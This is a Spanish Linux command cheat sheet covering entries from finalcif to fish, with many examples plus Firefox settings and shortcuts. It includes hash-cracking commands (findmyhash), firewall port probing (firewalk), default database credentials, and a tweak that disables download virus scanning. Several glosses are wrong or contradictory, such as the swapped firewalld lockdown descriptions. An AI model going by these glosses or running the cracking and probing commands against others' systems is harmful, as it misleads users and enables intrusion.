    a			Autoescalar
    w			Ajustar al ancho.
    h			Ajustar a la altura.
    j/k			Desplegar/subir.
    f/m			Voltear/espejo.
    r/R			Girar (en sentido del reloj y en sentido contrario)
    q			Salir


finalcif
Herramienta diseñada para editar y validar archivos en formato CIF (Crystallographic Information File), un estándar utilizado en cristalografía para describir estructuras cristalinas.
$ finalcif estructura.cif (abre el archivo .cif en modo interactivo permitiendo modificar campos como parámetros de celda unitaria, posiciones atómicas, etc)
$ finalcif --check estructura.cif (verifica errores sintácticos o semánticos)
$ finalcif --report estructura.cif > reporte.txt (generar un informe de validación y guardaro en reporte.txt)
$ finalcif --fix estructura.cif (corregir errores automáticamente)
$ finalcif --json estructura.cif > estructura.json (convertir a formato JSON)


finch
Cliente de mensajería instantánea en ncurses. La primera vez que se ejecute  mostrará la ventana de “Cuentas”, desde donde se configuran las distintas cuentas para conectarse.
Algunos atajos de teclado:
	Alt + a (menú)
	^ + q (Cerrar aplicación)
	Alt + n (Ir a la ventana siguiente)
	Alt + p (Ir a la ventana anterior)O
	Alt + c (Cerrar la ventana actual)
	Alt + r (Redimensionar la ventana con las teclas del cursor)
	Alt + o (Abrir menú de ventana)
	Alt+num (cambiar a la ventana indicada)
	tab (navegar por las distintas opciones)
	espacio (Marcar/desmarcar opciones)
	enter (Seleccionar opción)
	esc (Salir de opciones)



fincore
Cuenta páginas del contenido de los archivos y número de bytes. Si se produce un error durante el conteo, se imprime un mensaje de error en pantalla y fincore continúa procesando el resto de archivos listados en una línea de comandos.
$ fincore -b text1.txt text2.html


find
Buscar archivos o directorios
$ find / -iname archivo     (Busca en / archivo sin distinguir minusculas y mayusculas)
$ find /home -name *.png -print      (Buscará en /home todos los archivos “.png” y mostrará la ruta)
$ find . -name "*.bak" -exec rm {} \; (buscará en el directorio todos los acabados en .bak y los borrará. la instrucción "-exec" seguido del comando a ejecutar. los corchetes {} se refiere a los ficheros que find ha encontrado y la barra invertida seguido de punto y coma \; indica el final de la instrucción)
$ find . ! -iname “*.png” ! -name “*.jpg”  (Buscar en el directorio actual todos los archivos menos los acabados en png y jpg)
$ find . -type f -iname '*.txt' -o -iname '*.pdf' (buscar en el directorio actual y subdirectorios todos los .txt y los .pdf)
$ find . -amin -15 (Buscar los que se ha accedido en los últimos 15 minutos)
$ find . -atime 15 (Buscar los que se accedió por última vez hace 15 dias)
$ find / -amin -10 (Los que se ha accedido los últimos 10 minutos)
$ find . -type f  (Buscar ficheros)
$ find . -type d  (Buscar directorios)
$ find / -iname fichero 2>/dev/null  (buscar redireccionando los avisos de permiso denegado a /dev/null)
$ find . -iname "*.txt" -or -iname "*.odt" -exec cp {} documentos \; (Buscar los txt y los odt y copiarlos a la carpeta documentos)
$ find . -type d -exec chmod 0755 {} \; (Cambiar permisos de todos los directorios y subdirectorios)
$ find . -type f -exec chmod 0644 {} \; (Cambiar permisos de todos los ficheros del directorio y de los subdirectorios)
$ find . -type f -iname "*.bak" | xargs rm (buscar los ficheros acabados en .bak y borrarlos. xargs hace lo mismo que exec pero usando una tuberia.)
$ find /home/usuario -name * | xargs grep "tractatus" (buscar cadena de caracteres "tractatus" dentro de todos los archivos de /home/usuario)
$ find /home/usuario -iname '*.bak' -delete (Otra forma de borrar todos los .bak de un directorio)
$ find . -type f -iname *.sla (buscará los ficheros .sla)
$ find . -type f -mtime 0 (Buscará los ficheros creados o modificados hoy)
$ find / -type f -mtime -1 -print (Los modificados las últimas 24 horas)
$ find / -mtime +2 -print (Los modificados hace más de dos dias)
$ find -L . -type l  (Buscar enlaces rotos)
$ find -name "#*#" -print -delete (suprimir todos los que empiecen por *)
$ find -name "*~undo-tree~" -print -delete (en emacs todos los bufers que han dejado rastros *undo-tree*)
$ find . –type l (lo mismo)
$ find . -type l -delete (eliminat todos los enlaces rotos)
$ find . -type f -size +300k > masde300k.txt (buscar .sh mayores de 300k)
$ find ./ -name .svn -exec rm -rf {} \; (eliminar todos los directorios y subdirectorios subversión)
$ find . -name "*.html" -exec grep -i -H "Tractatus elementalis" {} \; (Buscar en todos los archivos html del directorio actual con un texto concreto)
$ find . -name \*.txt -exec sed -i "s/cosa/casa/g" {} \; (Substituir “cosa” por “casa” en todos los .txt del presente directorio)
$ find ~/ -depth -type f -empty (Buscar archivos vacios. Con -type d buscará directorios vacios)
$ find / -name "algo" -a ! -path "/media/servidor/*" -exec echo {} \; 2>/dev/null (Buscar "algo" descartando el directorio /media/servidor/)
$ find /home/usuario -iname '*.odt' -exec cp '{}' /home/usuario/Documentos \; (Copiar todos los odt a la carpeta Documentos)
$ find . -type f -amin -5 ! -path "./.*" (Buscar ficheros modificados los últimos 5 minutos descartando los ocultos)
$ find . ! -name "plantilla*" -type f -delete | find . ! -name HTMLS -type d -delete (borrar todos menos los "plantilla*" y el directorio "HTMLS")
$ find -L /sys/bus/pci/devices/*/ata*/host*/target* -maxdepth 3 -name "sd*" 2>/dev/null | egrep block |egrep --colour '(ata[0-9]*)|(sd.*)' (Encontrar qué /dev/sda, sdb, etc. corresponde al ATA/SATA declarado en dmesg, etc para determinar qué disco duro es)


findbugs
Analizador estático de código java para encontrar bugs como posibles errores, problemas de diseño y malas prácticas en el código fuente.
$ findbugs -textui src/main/java/MiClase.java (analiza solo el archivo MiClase.java)
$ findbugs src/main/java (analizará todos los archivos Java en el directorio src/main/java)
$ findbugs -textui -exitcode src/main/java (muestra el resultado en modo texto interactivo y retorna un código de salida basado en la severidad de los bugs encontrados)
$ findbugs -textui -bugpatterns org.eclipse.jdt.core.** @src/main/java (busca solo los bugs de tipo "org.eclipse.jdt.core")
$ findbugs -textui -exclude org.eclipse.jdt.core.* @src/main/java (ignora los bugs en los archivos que comienzan con "org.eclipse.jdt.core")


finddup
[perforate]. Encuentra archivos idénticos
$ finddup -n -i (comprueba el directorio actual y solo imprime la salida y no comprueba que el propietario del archivo y los permisos coincidan)
$ finddup -v -i -l -d DIR (máxima información, sin comprobar permisos y vinculando archivos idénticos del directorio mencionado)


findent
Herramienta que se utiliza para formatear y organizar el código fuente en lenguaje Fortran, ya sea de formato fijo, el clásico, donde las primeras 6 columnas son reservadas para las etiquetas y las columnas 7 a 72 para el código real y que las líneas deban terminar en la columna 72 o el libre, estilo más moderno, donde el código puede ser escrito sin las restricciones de las columnas y se permite más flexibilidad, con el objetivo de mejorar la legibilidad del código.
$ findent -v archivo.f90  (agrega comentarios de versión y detalles sobre el archivo procesado)
1.-
Ejemplo con un archivo de código en formato libre que no está indentado y su resultado indentado con findent
$ nano ejemplo.f90
       program ejemplo
       print *, 'Hola Mundo'
       end program ejemplo
$ findent archivo.f90
$ nano ejemplo.f90
       program ejemplo
           print *, 'Hola Mundo'
       end program ejemplo


findfs
Busca el sistema de ficheros por su etiqueta (LABEL) o UUID.
$ findfs UUID=388dda65-2432-4684-8cd9-b1649006fe30
$ findfs LABEL=datos


findimagedupes
Encuentra imágenes visualmente similares o duplicadas. findimagedupes es una utilidad que analiza las diferencias entre dos imágenes. Esto permite comparar dos imágenes o todo un árbol de imágenes y determinar si alguna es similar o idéntica.
$ findimagedupes -R /directorio (buscar duplicados en el directorio específicado y los subdirectorios)
$ findimagedupes /directorio --ignore .jpg,.png (ignorar ciertos tipos de archivos)
$ findimagedupes /directorio --limit 10 (limitar el número de resultados mostrados)
$ findimagedupes /directorio --names-only (mostrar solo los nombres de los archivos duplicados)
$ findimagedupes /ruta/del/directorio --ignore-case --ignore "thumb" (ignorar ciertas palabras en los nombres de los archivos)
$ findimagedupes /directorio1 /directorio2 (comparar dos directorios diferentes)
$ findimagedupes /directorio --max-size 1000k (usar un tamaño máximo para comparar)
$ findimagedupes /directorio --ignore-pattern "_*." (ignorar ciertos patrones en los nombres de los archivos)
$ findimagedupes -R -- . (buscar duplicados en todos los subdirectores del riectorio actual)
$ findimagedupes imagen1.jpg imagen2.jpg imagen3.jpg (comparar varios archivos especificados)
$ findimagedupes -f /base_de_datos.huf -- . (usar una base de datos de huellas existente9
$ findimagedupes -M nueva_base.huf -f base1.huf -f base2.huf -- . (combinar vias bases de datos)
$ findimagedupes -t 95% -- . (establecer un umbral de similitud)
$ findimagedupes -v md5,fingerprint -- . (verbose con detalles adicionales)
$ findimagedupes -c coleccion.gqv -- . (crear una colección de GQView)


findmnt
Muestra una lista de sistemas de archivos montados.
$ findmnt -A (En forma de arbol)
$ findmnt -s (en /etc/fstab)
$ findmnt -s -t ext4 (Especificando una extensión concreta)
$ findmnt -m (en /etc/mtab)
$ findmnt -l (Los muestra como lista)


findmyhash
Busca hashes de contraseñas en diferentes servicios web gratuitos para tratar de romperlos. Descarga <https://code.google.com/p/findmyhash/downloads/list>
$ python findmyhash.py MD5 -h "098f6bcd4621d373cade4e832627b4f6"
$ python findmyhash.py SHA224 -h "e98da241a4504c5e52f0ef06f87a7598e7db22e1579326441fe7aa50"


findsmb
Busca máquinas en la red que respondan al protocolo samba.
$ findsmb -r


findutils
Proporciona las utilidades find [ver] y xargs [ver].


fing
Escaner de la conexión wiki. Página de descarga http://www.overlooksoft.com/
# fing


finger
Quien está conectado al sistema, tiempo, consola...
$ finger -s
$ finger -l
$ finger usuario@localhost (muestra detalles como el nombre completo, el directorio home, shell, o si está conectado)
$ Finger @hostname (devuelve información general sobre el sistema remoto)


finit
Alternativa a SysV init y systemd.
# finit 0 (cerrar el sistema. Equivalente a "init 0")
# finit 6 (reiniciar el sistema. Equivalente a "init 6")
# finit 1 (entrar en modo recuperar sistema)
# finit q (releer la configuración si se ha modificado)


fio
Herramienta utilizada para realizar pruebas de rendimiento de almacenamiento y cargas de trabajo que imitan operaciones de entrada y salida [Input/Ouput- I/O] en discos duros, SSDs, sistemas de archivos, entre otros.
$ fio --name=prueba --ioengine=sync --rw=write --bs=4k --size=1G --numjobs=1 --time_based (nombre de la prueba, motor sincrónico, pruebas de escritura, 4 KB tamaño de bloque, tamaño total archivo de 1 GB, 1 hilo de ejecución y de forma indefinida)
$ fio --name=prueba --ioengine=sync --rw=randread --bs=4k --size=1G --numjobs=1 --runtime=60 (realiza operaciones de lectura aleatoria, con bloques de 4Kb,1 solo hilo de prueba y durante 60 segundos)
$ fio --name=prueba --ioengine=sync --rw=randwrite --bs=8k --size=500M --numjobs=4 (realiza operaciones de escritura aleatoria, tamaño de bloque de 8 KB y ejecutando 4 hilos simultaneamente)
$ fio --name=prueba --ioengine=sync --rw=randwrite --bs=4k --size=1G --numjobs=2 --rw=randread --time_based (escritura aleatoria, 2 hilos de ejecución, la segunda operación es lectura aleatorio y se ejecuta de forma indefinida)


firebird3.0-server
Es una base de datos relacional. La contraseña "sysdba" la solicita durante la instalación.
# systemctl status firebird3.0.service (con la instalación se activa)


firebird3.0-utils
contiene las utilidades para administrar bases de datos de Firebird.
$ isql-fb /ruta/a/database.fdb -user sysdba -password masterkey (conectar a base de datos local)
$ isql-fb localhost:/ruta/a/database.fdb -user sysdba -password masterkey (conectar a servidor remoto)
$ isql-fb database.fdb -i script.sql -o resultado.txt (ejecutar script SQL desde archivo)
$ gbak -b -user sysdba -password masterkey database.fdb backup.fbk (backup completo)
$ gbak -b -g -user sysdba -password masterkey database.fdb backup.fbk (backup comprimido)
$ gbak -c -user sysdba -password masterkey backup.fkb nueva_database.fdb (restaurar backup)
$ gbak -c -rep -user sysdba -password masterkey backup.fbk database.fdb (restaurar sobreescribiendo)
$ gfix -shut -tran 60 -force 0 database.fdb (apagar base de datos para mantenimiento)
$ gfix -online database.fdb (encender base de datos)
$ gfix -mend -full database.fdb (reparar base de datos corrupta)
$ gfix -v -full database.fdb (ver estado de la base de datos)
$ gsec -user sysdba -password masterkey -display (listar usuarios)
$ gsec -user sysdba -password masterkey -add usuario_nuevo -pw su_password (agregar usuario)
$ gsec -user sysdba -password masterkey -mod usuario_nuevo -pw nuevo_password (modificar usuario)
$ gsec -user sysdba -password masterkey -del usuario_nuevo (eliminar usuario)
$ fbstat -h database.fdb (estadísticas generales)
$ fbstat -t TABLA database.fdb (estadísticas detalladas por tabla)
$ fbstat -d database.fdb (mostrar páginas de datos)
$ nbackup -L database.fdb (iniciar backup en línea sin bloquear la BD)
$ nbackup -B 0 database.fdb backup.nbk (realizar backup físico)
$ nbackup -R backup.nbk database.fdb (restaurar desde backup nbackup)
$ gpre -lang cpp programa.e (precompilar archivo .e [Embedded SQL])
$ gpre -lang c programa.e (generar código C)


firebuild
Funciona almacenando en caché las salidas de los comandos ejecutados y reproduciendo los resultados cuando los mismos comandos se ejecutan con los mismos parámetros dentro del mismo entorno.
# firebuild -r htop (genera un informe con nombre firebuild-build-report.html sobre el comando htop)


firefox
Navegador.
$ firefox --private (Nota.- Son dos guiones. Arrancar en modo privado. Para incluir por defecto este modo en la propiedades: firefox --private %U)
$ firefox 'data:text/html, texto que queremos mostrar' (Visualizar un texto en una ventana del navegador)
$ MOZ_ALLOW_DOWNGRADE=1 firefox -P (En caso de desactualizar firefox necesitaremos pasar el MOZ_ALLOW_DOWNGRADE=1 para poder usar el perfil de usuario que teníamos. Con el -P seleccionamos qué perfil queremos, saldrá una ventanita. Testeado con versión 89.0.1 hacia 88.0)
Cambios para optimizar las conexiones y para aprovechar otros parámetros. Escribir en la barra de direcciones: "about:config" y pulsar enter. Cambiar los siguientes valores. Para ello, hacer doble click encima de la línea a modificar y en el cuadro de diálogo que aparece, escribir el valor nuevo:
Ajustes generales [dependen de la versión instalada]:
network.dns.disableIPv6 true
network.http.max-connections 128
network.http.max-connections-per-server 48
network.http.max-persistent-connections-per-proxy 24
network.http.max-persistent-connections-per-server 12
network.http.pipelining true
network.http.proxy.pipelining true
network.http.pipelining.maxrequests 30
browser.sessionstore.interval 300000
Activar protección contra el tracking:
	privacy.trackingprotection.enabled	true
Desactivar escaneo de virus.
	browser.download.manager.scanWhenDone false
Guarda pestañas abiertas al cerrar:
	browser.showquitwarning true
Deshabilitar la opción de recuperación de sesión.
	browser.sessionstore.enabled false
Si tenemos problemas con hotmail, suprimir el nombre de la distro:
	general.useragent.vendor
Instalar extensiones incompatibles (peligroso):
	extensions.checkCompatibility  False
Si no queremos que pregunte por guardar contraseñas:
	signon.RememberSignons false
Activar tecla backspace para ir a la página anterior
	browser.backspace_action 0
Visualizar todas las pestañas:
	browser.allTabs.previews true
Cambiar idioma:
	general.useragent.locale
Deshabilitar o aumentar la cantidad de sugerencias de la barra de direcciones (por defecto 12. Dehabilitar -1).
	browser.urlbar.maxRichResults  15
Modificar el intervalo de tiempo de recuperación de sesión (1 segundo=1000. Por defecto cada 10 segundos) El parámetro anterior tiene que estar en "true".
	browser.sessionstore.interval 20000
Mejorar la calidad de color (consume muchos recursos).
	gfx.color_management.enabled true
Suprimir el scroll de pestañas aunque tengamos muchas abiertas (por defecto 100).
	browser.tabs.tabMinWidth 0
Abrir las ventanas emergentes en una nueva pestaña (por defecto lo abre como ventana [2]. Para no abrir ninguno [1])
	browser.link.open_newwindow.restriction 0
Habilitar diccionario para todos los campos de texto (por defecto solo multilinea [1]. Deshabilitar [0]).
	layout.spellcheckDefault 2
Abrir resultados de búsqueda en otra pestaña.
	browser.search.openintab true
Modificar la caché (por defecto 50000 kb)
	browser.cache.disk.enable true.
	browser.cache.disk.capacity 100000
Habilitar sugerencias de autocompletado en la barra de direcciones.
	browser.urlbar.autofill  true
Auto exportar Favoritos para sincronización con otro navegador
	browser.bookmarks.autoExportHTML true
Aumentar el historial de "deshacer cerrar pestaña". (por defecto 10)
	browser.sessionstore.max_tabs_undo 20
Deshabilitar tiempo de espera al agregar complementos (por defecto 5 segundos)
	security.dialog_enable_delay 0
Ver código fuente con el editor favorito.
	view_source.editor.external true
	view_source.editor.path /ruta/al/editor
Mostrar siempre [incluso en modo "pantalla completa"] la barra superior.
	browser.fullscreen.autohide false
Aumentar lista de búsqueda de complementos (por defecto 5).
	extensions.getAddons.maxResults 10
Evitar que un sitio modifique el tamaño de ventanas.
	dom.disable_window_move_resize true
Mostrar las pestañas abiertas como miniaturas. Crea un botón que muestra una vista previa de pestañas abiertas.
	browser.allTabs.previews  true
No mostrar favicon en la barra de direcciones y en las pestañas.
	browser.chrome.site_icons  False
Evitar cuelgues al abrir muchas pestañas (por defecto 256)
	network.http.max-connections 48
Desactivar sitios más visitados en nueva página:
	browser.newtabpage.enabled  false
Al abrir nueva pestaña que se abra con un URL concreta:
	browser.newtab.url
Que las preferencias se abran en nueva pestaña y no en nueva ventana:
	browser.preferences.InContent true
Habilitar lector nativo de pdf en javascript:
	pdfjs.disable false
Habilitar dominios multilingües [idn] -Que continenen caracteres raros.
	network.enableIDN true
Ver listado de todos los idn habilitados [todos en true]:
	network.IDN.whitelist
Habilitar lector de pdfs:
	pdfjs.disabled true
Habilitar soporte para H.264, AAC y mp3:
	media.gstreamer.enabled true
Rechazar cookies automaticamente:
        cookiebanners.service.mode 2
        cookiebanners.service.mode.privateBrowsing 2
Acceso a los diálogos de firefox:
	chrome://browser/content/bookmarks/bookmarksPanel.xul  (las direcciones de interés)
	chrome://browser/content/history/history-panel.xul  (historial)
	chrome://global/content/console.xul (Consola Javascript)
	chrome://passwordmgr/content/passwordManager.xul (Administrador de contraseñas)
	chrome://pippki/content/getpassword.xul (Establecer contraseña maestra)
	chrome://pippki/content/resetpassword.xul (Restablecer contraseña maestra)
	chrome://mozapps/content/downloads/downloads.xul (lista de descargas efectuadas)
	chrome://browser/content/browser.xul (abre un navegador completo en una pestaña)
	chrome://browser/content/preferences/preferences.xul (Abre las preferencias)
Archivos de interés en los perfiles de firefox (.mozilla/firefox/*.default):
	bookmarks.html - Nuestros marcadores
	cert8.db - Certificados de seguridad
	formhistory.dat - Formularios memorizados
	key3.db - Contraseñas almacenadas
"about:" (escrito en la barra de direcciones de firefox):
	about:  (Información sobre el navegador)
	about:blank  (Una página en blanco)
	about:buildconfig  (Detalles de la compilación para nuestra versión)
	about:cache  (información sobre la cache del navegador)
	about:cache?device=memory  (Muestra la caché en memoria)
	about:cache?device=disk  (Muestra la caché de disco)
	about:config  (Configuración del navegador)
	about:credits  (Lista de los que contribuyeron al desarrollo del navegador)
	about:logo  (El logo del navegador)
	about:mozilla  (Muestra un pasaje de “El Libro de Mozilla”)
	about:plugins  (lista detallada de los plugins que tenemos instalados)
$ grep -hIr :name ~/.mozilla/firefox/*.default/extensions | tr '<>=' '"""' | cut -f3 -d'"' | sort -u  (listar las extensiones de firefox)
$ firefox -ProfileManager -no-remote (crear un perfil sin cerrar firefox)
$ firefox http://www.google.com/search?q=BUSQUEDA (buscar algo por linea de comandos [abre el navegador])
$ firefox http://images.google.com/images?q=BUSQUEDA (Lo mismo para imágenes)
$ firefox http:/books.google.es/search?q=BUSQUEDA (lo mismo con libros)
$ firefox http://news.google.es/news/search?q=BUSQUEDA (Con noticias)
$ find ~/.mozilla -iname '*.sqlite' -execdir sqlite3 {} 'vacuum;' \; (desfragmentar la base de datos de firefox. Tambien existe plugin[SQLite Manager])
1.-
Mandar un email desde la barra de direcciones (Valido tambien para chromium):
Tener configurado un gestor de correos [evolution, thunderbird..]. Escribir en la abarra de direcciones:
	mailto:usuario@gmail.com
Del destinatario. Se abrira el gestor de correo listo para escribir.
Atajos:
Navegación:
	Alt + <- (Ir a la página anterior)
	Atl + -> (Ir a la página siguiente)
	Alt + inicio (Inicio)
	^ + o (Abrir archivo)
	F5 (Recargar)
	^+ F5 (Recargar reemplazando caché)
	Esc (Detener)
Página actual:
	Fin (Ir al final de la página)
	Inicio (Ir a principio de la página) date
	F6 (Ir a la siguiente pestaña)
	Mayús + F6 (Ir a la anterior pestaña)
	^+ p (Imprimir)
	^+ s (Guardar página como...)
	^+ + (Aumentar tamaño texto)
	^+ - (Reducir tamaño texto)
	^+ 0 (Restablecer tamaño texto)
Editar:
	^+ c (Copiar)
	^+ x (Cortar)
	Supr (Eliminar)
	^+ v (Pegar)
	^ + Z (Rehacer)
	^+ a (Seleccionar todo)
	^+ z (Deshacer)
Buscar:
	^ +f (Encontrar)
	F3 (Encontrar de nuevo)
	Mayús * F3 (Encontrar anterior)
	' (Búsqueda texto de enlaces)
	/ (Búsqueda rápida)
	Esc (Cerrar busquedas)
	^+ k (Barra de búsqueda)
	Alt + flecha arriba/abajo , con el foco en la barra (Seleccionar motor busqueda)
Ventanas y pestañas:
	^ + w (Cerrar pestaña)
	Alt + F4 (Cerrar ventana)
	^ + <- (Mover pestaña a la izq.)
	^+ -> (Mover pestaña a la dere.)
	^+ home (Mover pestaña al comienzo)
	^+ fin (Mover pestaña al final)
	^+ t (Nueva pestaña)
	^+ n (Nueva ventana)
	Alt + intro desde la barra direcciones o bus1uedas (Abrir en nueva pestaña)
	^+ tab (Pestaña siguiente)
	^+ Mayús + tab (Pestaña anterior)
	^+ Mayús + t (Deshacer cerrar pestaña)
	^+ Mayús + n (Deshacer cerrar ventana)
	^+ 1 ....8 (Seleccionar pestaña 1 a 8)
	^+ 9 (Seleccionar última pestaña)
	^+ Mayús + e (Vista grupos de pestañas)
	Esc (Cerrar vista de grupos pestañas)
Historial:
	^+ h (Panel lateral de Historial)
	^+ H (Historial)
Marcadores:
	^ + D (Agregar pestañas a marcadores)
	^+ d (Agregar página a marcadores)
	^+ b (Panel lateral de marcadores)
	^+ O (Marcadores)
Herramientas: http://www.overlooksoft.com/
	^+ Y (Descargas)
	^+ A (Complementos)
	^+ K (Consola web)
	^+ I (Inspeccionar)
	Mayús + F4 (Borrador)
	^+ u (Código fuente de la página)
	^+ J (Consola de errores)
	^+ i (Información de la página)
	^+ P (Navegación privada)
	^+ S (Limpiar historial) http://www.overlooksoft.com/
Otros atajos:
	^+ intro (Completar dirección .com)
	Mayús + intro (Completar dirección .net)
	^+ Mayús + intro (Completar dirección .org)
	Alt (Ver barra de menús en kde)
	F10 (Ver barra de menús en gnome)
	^+ / (Mostrar/Ocultar complementos)
	F7 (Navegación con cursor)
	F11 (Pantalla completa)
	^+ l (Barra de direcciones)


firehol
Genera firewalls genéricos basados en iptables. El archivo de configuración se encuentra en /etc/firehol/firehol.conf. Primero activar la configuración básica:
       START_FIREHOL=YES
       WAIT_FOR_IFACE="enp1s0" (la interfaz de red [eth0, wlan0 ...)
       FIREHOL_ESTABLISHED_ACTIVATION_ACCEPT=1 (permitir tráfico preestablecido mientras el firewall esté activado)
Otras opciones:
	0 (No permitir que el tráfico preestablecido continúe mientras el firewall esté activado)
        "optimal" (óptimo)
	"accurate" (preciso)
# firehol helpme > /tmp/firehol.conf (crea una configuración adaptada a nuestro pc y la guarda en un archivo)
# firehol try /tmp/firehol.conf (después de parar la aplicación [firehol stop] probar la configuración anterior y si nos satisface, copiarla en /etc/firehol/firehol.conf)
# firehol start (tambien se tiene que arrancar)
# firehol stop  (parar servicio)
# firehol status (estado de las conexiones)
# firehol cstatus (estado de las conexiones de forma interactiva)
# firehol panic (bloquear toda la comunicación IP)
# firehol restore (volver al estado normal de la aplicación)
# firehol restart (reiniciar despues de un cambio en la configuración)
# firehol explain (ingresar al modo interactivo y probar directivas. También proporciona los comandos de iptables para cada directiva junto con el razonamiento. No modifica ningún archivo de configuración)
  FireHOL [:] >
Después de entrar en modo interactivo con la aplicación, podemos probar entrando algunos conceptos:
  FireHOL [:] > interface eth0 world
  FireHOL [interface:world] > server smtp accept
  FireHOL [interface:world] > server ssh accept
  FireHOL [interface:world] > client http accept
  FireHOL [interface:world] > quit
Si alguno nos interesa podemos entrarlo en el archivo de configuración /etc/firehol/firehol.conf
1.- Muestra de un archivo de configuración
# nano /etc/firehol/firehol.conf
...
# Acepta todo el trafico entrante
interface any world
# Rechazar todos los paquetes entrantes
policy drop
# Todas las politicas de proteccion activas.
protection all
# Politicas de servicios que ofrecemos [web y torrents]
#server "http https" accept
#server p2p accept
# Todo el trafico saliente aceptado
client all accept


firejail
[firetools]. Programa que reduce el riesgo de violaciones de seguridad restringiendo el entorno de ejecución de aplicaciones no confiables encerrandolas en "jaulas" [sanbox] aisladas del sistema operativo, esto incluye al proceso y todos sus descendientes.
$ firejail transmission-gtk
# firejail /etc/init.d/nginx start
$ firejail --private --dns=8.8.8.8 --dns=8.8.4.4 firefox -no-remote
$ firejail --net=eth0 firefox
$ firejail --net=eth0 --ip=192.168.1.207 firefox
$ firejail firefox&
$ firejail vlc
$ firejail --net=none vlc (ejecutar vlc sin que tenga acceso a internet)
$ firejail --list (lista de programas que se estan ejecutando en el sandbox)
$ firejail --top (monitorizar el consumo de recursos de los programas del sandbox)
Nota.- el ampersand [&] permite cerrar la terminal y que el programa se siga ejecutando
La totalidad de perfiles disponibles se muestra en:
	$ ls /etc/firejail/


fireqos
Es un modelo de red que simula cargas de trabajo en redes virtuales o físicas, permitiendo analizar y probar diferentes escenarios de red antes de implementarlos en el entorno real. Precisa un archivo de configuración, un modelo en https://github.com/firehol/firehol/blob/master/etc/fireqos.conf.example
# fireqos start (iniciar)
# fireqos status world-out (tráfico hacia fuera)
# fireqos status world-in (tráfico hacia adentro)
# fireqos stop (parar la prueba)
# fireqos clear_all_qos (limpiar todo el tráfico generado)
# fireqos dump servers (muestra el de servers)


firewalk
Herramienta de análisis de red que permite determinar qué puertos/protocolos son permitidos a través de un dispositivo de red como un firewall o router que realiza reenvío IP [forwarding]. Envia paquetes con TTL [Time To Live] calculado para que expiren justo después del dispositivo de reenvío y analiza las respuestas o la falta de ellas, para determinar si el tráfico es permitido
# firewalk -S 22,80,443 -p TCP 192.168.1.1 10.0.0.1 (escanea los puertos 22 [SSH], 80 [HTTP] y 443 [HTTPS] del protocolo TCP de la dirección IP del gateway/firewall y la dirección IP de un host detrás del firewall)
# firewalk -S 53,123 -p UDP 192.168.1.1 10.0.0.1 (escanea puertos UDP comunes, el 53 para DNS, 123 para NTP)
# firewalk -S 1-1024 -p TCP -d 5 192.168.1.1 10.0.0.1 (establece el TTL inicial en 5)
# firewalk -S 1-100 -p TCP 192.168.1.1 10.0.0.1 (escanea los primeros 100 puertos TCP)


firewalld
Es un demonio de firewall administrado dinámicamente con soporte para zonas de red/firewall para definir el nivel de confianza de las conexiones o interfaces de red. De modo predeterminado Firewalld tiene diferentes tipos de zonas. Cada una tiene un distinto nivel de seguridad: Para redes públicas: drop, block y public [predeterminada], redes externas: external, redes para hogar: work, home y internal y trusted en que todas las conexiones son aceptadas. En la mayoria se descartan los paquetes entrantes no solicitados y el resto son rechazados. Los registros en /var/log/firewalld.
# systemctl enable firewalld (iniciar firewalld automaticamente al inicio del sistema)
# firewall-cmd --state (comprobar si esta activo. Más información: systemctl status firewalld)
# firewall-cmd --check-config (si el archivo de configuración tiene errores)
# firewall-cmd --set-log-denied=all (registrar todos los paquetes descartados [unicast, broadcast, multicast])
# firewall-cmd --get-log-denied (imprimir el registro de valores denegados)
# firewall-cmd --list-all (visión completa de la configuración de firewalld)
# firewall-cmd --list-all --zone=home (de una zona concreta)
# firewall-cmd --add-service=ssh --timeout 15m (incluir ssh durante 15 minutos al firewall)
# firewall-cmd --permanent --get-zones
# firewall-cmd --reload (releer configuración después de algún cambio)
# firewall-cmd --panic-on (desactivar inmediatamente el trafico de red)
# firewall-cmd --panic-off (volver a activarlo)
# firewall-cmd --query-panic (comprobar si está activado o no el modo panic)
# firewall-cmd --query-lockdown (consultar si el bloqueo está habilitado)
# firewall-cmd --lockdown-on (desbloquear bloqueo del firewall. Solo las aplicaciones en la lista blanca puedan solicitar cambios)
# firewall-cmd --lockdown-off (habilitar el bloqueo)
# firewall-cmd --list-services (servicios no permitidos)
# firewall-cmd --get-services (numerar todos los servicios predefinidos)
# firewall-cmd --add-service=samba (añadir un servicio a los permitidos)
# firewall-cmd --runtime-to-permanent (que la nueva configuración sea permanente)
# firewall-cmd --list-ports (listar los puertos permitidos)
# firewall-cmd --add-port=22/tcp (añadir un puerto y tipo a los permitidos)
# firewall-cmd --remove-port=22/tcp (cerrar un puerto)
# firewall-cmd --list-all-zones (información detallada de todas las zonas)
# firewall-cmd --zone=public --list-all (información detallada de una zona concreta)
# firewall-cmd --get-default-zone (verificar qué zona es la utilizada por el firewalld)
# firewall-cmd --get-active-zone (ver los interfaces asociados a cada zona)
# firewall-cmd --add-lockdown-whitelist-user=USER (añadir USER a la lista blanca)
# firewall-cmd --remove-lockdown-whitelist-user=USER (suprimir USER de la lista blanca)
# firewall-cmd --query-lockdown-whitelist-user=USER (consultar si USER esta en la lista blanca)
# firewall-cmd --list-lockdown-whitelist-users (consultar listado de usuarios de la lista blanca)
# dmesg | grep -i REJECT (ver los paquetes rechazados)


firewall-tests
Test completo del sistema sobre el firewall [ver].
# /usr/share/firewalld/testsuite/testsuite


fische
Aplicación, basada en libsdl y el controlador de audio ALSA, permite visualizar el sonido emitido por un reproductor, creando ondas y efectos especiales.
$ fische -e -f --exit-on-mouseevent (en modo nervioso, pantalla competa y salir al hacer clic con el ratón)
$ fische -g 1280x800 (especificando el ancho y la altura de la animación. Por defecto 800x400)


fish
[Friendly Interactive SHell]. Intérprete de comandos.
$ fish (entra en la shell)
       > omf install dmorrell (instalar el tema)
       > omf install (descargar listado de todo lo disponible)
       > omf theme dmorrell (usar el tema)
       > omf remove dmorrell (eliminar un tema)
       > omf describe ocean (información de un tema)
       > omf list (lista de temas instalados)
       > omf repositories list (repositorios)
       > omf reload (Recargue Oh My Fish y todos los complementos)
       > omf new plugin
       > omf new theme dmorrell
       > omf search -t dangerous (buscar inf sobre un tema)
       > omf search -p omf (inf sobre un paquete)
       > omf doctor (información de git, sistema, oh-my-fish, fish version...)
       > rm ~/.config/fish/functions/fish_prompt.fish (si emiten errores en doctor)
       > omf destroy (desinstalar oh-my-fish)
       > omf chanel (El canal desde el cual OMF obtiene actualizaciones: stable o dev)
       > omf update (actualizar todos los paquetes)
       > omf update omf (actualizar un paquete)
       > omf repositories add https://github.com/sapoclay (añadir un repo. este no es correcto)
